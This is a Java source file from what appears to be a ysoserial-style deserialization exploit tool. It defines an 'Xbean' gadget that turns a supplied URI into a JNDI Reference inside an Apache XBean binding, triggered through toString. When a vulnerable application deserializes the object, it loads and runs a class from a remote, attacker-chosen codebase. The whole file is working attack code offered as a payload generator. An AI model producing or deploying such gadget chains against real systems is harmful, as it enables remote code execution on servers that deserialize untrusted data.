package com.qi4l.JYso.gadgets;

import com.qi4l.JYso.gadgets.utils.Reflections;
import org.apache.xbean.naming.context.ContextUtil.ReadOnlyBinding;
import org.apache.xbean.naming.context.WritableContext;

import javax.naming.Context;
import javax.naming.Reference;
import java.net.URI;

public class Xbean implements ObjectPayload<Object>{
    @Override
    public Object getObject(String command) throws Exception {
        //需要处理command
        UtilFactory uf = new UtilFactory();
        Context ctx = Reflections.createWithoutConstructor(WritableContext.class);
        URI uri = new URI(command);
        String args[] = {uri.getScheme() + "://" + uri.getAuthority(), uri.getPath().substring(1)};
        Reference ref = new Reference("foo", args[1], args[0]);
        ReadOnlyBinding binding = new ReadOnlyBinding("foo", ref, ctx);
        return uf.makeToStringTriggerUnstable(binding); // $NON-NLS-1$
    }

}
